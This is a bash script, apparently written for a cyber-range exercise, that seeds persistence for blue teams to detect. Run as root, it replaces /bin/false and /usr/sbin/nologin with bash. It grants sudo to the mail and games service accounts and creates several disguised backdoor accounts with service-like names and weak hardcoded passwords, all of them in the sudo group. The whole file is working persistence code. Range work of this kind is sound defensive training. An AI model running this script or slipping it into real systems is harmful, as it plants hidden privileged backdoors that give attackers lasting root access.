#!/usr/bin/env bash
# ===========================================================================
# persistence_seed.sh  —  OPFOR persistence artifacts for the range (blue-team
# detection/remediation practice). Run as root on each target box.
# Range/exercise use only. Edit freely — this is the payload the runner pushes.
# ===========================================================================

#Change 'false/nologin' shells to bash shells
cat /dev/null > /bin/false
cat /dev/null > /usr/sbin/nologin
cp /bin/bash /bin/false
cp /bin/bash /usr/sbin/nologin

#Establish Service Accounts for Persistence
usermod mail -s /bin/false
usermod games -s /bin/false
usermod mail -aG sudo
usermod games -aG sudo

#Create Additional User Accounts for Persistence
useradd vyatta -s /bin/bash
useradd Vyos -s /bin/bash
useradd ird -s /bin/false
useradd ntp -s /bin/false
useradd linux -s /bin/false
useradd golum -s /bin/bash
useradd mode_exporter -s /bin/bash

#Change Passwords
echo "mail:mailtime" | chpasswd
echo "games:gg" | chpasswd
echo "ntp:123" | chpasswd
echo "vyatta:vyatta" | chpasswd
echo "Vyos:mine" | chpasswd
echo "tss:tss" | chpasswd
echo "ird:ird" | chpasswd
echo "linux:mint" | chpasswd
echo "golum:ring" | chpasswd
echo "mode_exporter:gg" | chpasswd

#Sudo priv new accounts
usermod vyatta -aG sudo
usermod Vyos -aG sudo
usermod ird -aG sudo
usermod ntp -aG sudo
usermod linux -aG sudo
usermod golum -aG sudo
usermod mode_exporter -aG sudo

echo "[persistence_seed] done on $(hostname)"
